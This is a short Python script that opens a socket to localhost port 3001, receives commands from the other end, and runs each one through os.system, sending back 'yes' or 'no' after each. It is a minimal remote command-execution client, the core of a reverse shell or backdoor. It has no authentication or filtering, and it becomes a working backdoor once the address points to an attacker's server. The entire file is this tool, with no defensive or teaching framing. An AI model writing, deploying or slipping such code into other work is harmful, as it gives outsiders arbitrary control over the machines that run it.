import socket
import sys
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('localhost', 3001))

while True:
    command = str(s.recv(1024).decode())
    try:
        print(command)
        os.system(command)
        s.send('yes'.encode())
    except:
        s.send('no'.encode())
        break
